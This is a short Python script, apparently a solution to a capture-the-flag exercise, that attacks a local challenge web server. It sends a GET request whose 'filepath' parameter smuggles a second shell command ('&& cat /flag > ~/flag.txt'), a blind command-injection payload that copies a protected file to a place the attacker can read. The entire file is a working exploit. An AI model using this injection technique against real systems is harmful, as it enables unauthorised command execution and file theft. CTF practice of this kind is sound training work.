from requests import request

method = "GET"
site = "http://challenge.localhost"
port = 80

# Blindly get the flag.
params = { "filepath": " /some-non-existent-file && cat /flag > ~/flag.txt" }

url = f"{site}:{port}/"

response = request(method, url, params = params)

print(f"\nResponse: {response.text}")
